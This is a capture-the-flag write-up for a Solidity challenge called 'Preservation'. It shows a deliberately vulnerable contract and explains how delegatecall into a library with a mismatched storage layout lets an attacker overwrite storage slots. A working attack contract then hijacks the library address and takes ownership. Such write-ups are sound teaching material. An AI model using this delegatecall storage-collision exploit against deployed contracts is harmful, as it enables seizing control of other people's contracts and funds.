

## Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```
## Solution

We see the storage of LibraryContract and Preservation does not match , but the Preservation delegatecall the LibrayContract , so it will make some storage Collision problem . 

we can see in `Preservation::setFirstTime` delegatecall setTime , and it effect the `slot0` in Preservation , so we can build a attack contract and call setFirstTime to make the `address public timeZone1Library` equals `attacker's address` , then we call it again change the owner.
```solidity title="Hack.sol"
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IPreservation {
    function setFirstTime(uint256) external;
}

contract PreservationHack {
    // Same storage layout as contract to be attacked
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    IPreservation public challenge;

    constructor(address challengeAddress) {
        challenge = IPreservation(challengeAddress);
    }

    function setTime(uint256 _addr) external {
        owner = address(uint160(_addr));
    }

    function attack() external {
        challenge.setFirstTime(uint256(uint160(address(this))));
        challenge.setFirstTime(uint256(uint160(msg.sender)));
    }
}
```
